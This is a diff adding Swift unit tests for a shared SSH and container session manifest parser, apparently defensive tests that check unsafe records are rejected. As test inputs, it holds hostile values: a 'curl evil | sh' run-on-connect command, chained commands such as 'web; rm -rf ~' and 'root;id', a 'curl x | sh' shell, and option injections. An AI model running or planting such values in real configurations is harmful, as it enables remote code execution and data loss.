@@ -115,6 +115,62 @@ final class SharedInventoryTests: XCTestCase {
         XCTAssertEqual(parsed.skipped, 5)
     }
 
+    /// A container reached over SSH is where a host is, plus which container:
+    /// it's shared. What it runs is rebuilt from checked fields, never taken
+    /// as a command, and a personal run-on-connect still doesn't come along.
+    func testContainerOnAnSSHHostIsShared() throws {
+        var box = host("babbage", folder: "containers")
+        box.kind = .container
+        box.user = "ops"
+        box.identityFile = "~/.ssh/id_ed25519"
+        box.container = ContainerTarget(engine: .podman, name: "ix-plex-plex-1", shell: "/usr/bin/bash", user: "app:app")
+        box.runOnConnect = "curl evil | sh"
+
+        let parsed = try SharedManifest.parse(manifest([box]), sourceID: UUID())
+        let e = try XCTUnwrap(parsed.entries.first)
+        XCTAssertEqual(e.kind, .container)
+        XCTAssertEqual(e.hostname, "babbage.example.com")
+        XCTAssertEqual(e.user, "ops")
+        XCTAssertEqual(e.container, box.container)
+        XCTAssertNil(e.runOnConnect)
+        XCTAssertFalse(e.usesLocalTransport)
+        XCTAssertEqual(e.postConnectCommand, "podman exec -it -u app:app ix-plex-plex-1 /usr/bin/bash")
+        XCTAssertEqual(parsed.skipped, 0)
+    }
+
+    /// The exec is typed into the remote shell as the user, so every field
+    /// that reaches it is held to what it can legitimately be. A container on
+    /// this Mac (no host) runs its engine here and stays unshareable, and so
+    /// does every other kind.
+    func testContainerRecordsThatWouldDoMoreThanExecAreSkipped() throws {
+        func box(_ name: String, _ change: (inout SessionEntry) -> Void) -> SessionEntry {
+            var e = host(name)
+            e.kind = .container
+            e.container = ContainerTarget(engine: .docker, name: "web", shell: "sh", user: "")
+            change(&e)
+            return e
+        }
+        let records = [
+            box("local") { $0.hostname = "" },
+            box("no-target") { $0.container = nil },
+            box("empty-name") { $0.container?.name = "" },
+            box("chained-name") { $0.container?.name = "web; rm -rf ~" },
+            box("option-name") { $0.container?.name = "--privileged" },
+            box("command-shell") { $0.container?.shell = "sh -c 'curl x | sh'" },
+            box("odd-shell") { $0.container?.shell = "/tmp/payload" },
+            box("option-shell") { $0.container?.shell = "-c" },
+            box("chained-user") { $0.container?.user = "root;id" },
+            box("option-user") { $0.container?.user = "-uroot" },
+            box("pod") { $0.kind = .kubernetes },
+            box("serial") { $0.kind = .serial },
+        ]
+        let fine = box("fine") { _ in }
+
+        let parsed = try SharedManifest.parse(manifest(records + [fine]), sourceID: UUID())
+        XCTAssertEqual(parsed.entries.map(\.name), ["fine"])
+        XCTAssertEqual(parsed.skipped, records.count)
+    }
+
     func testFoldersCannotClimbOrHideControlCharacters() throws {
         let parsed = try SharedManifest.parse(
             manifest([host("a", folder: "../../etc/./lab\u{0}")], folders: ["/x//y/", ".."]),
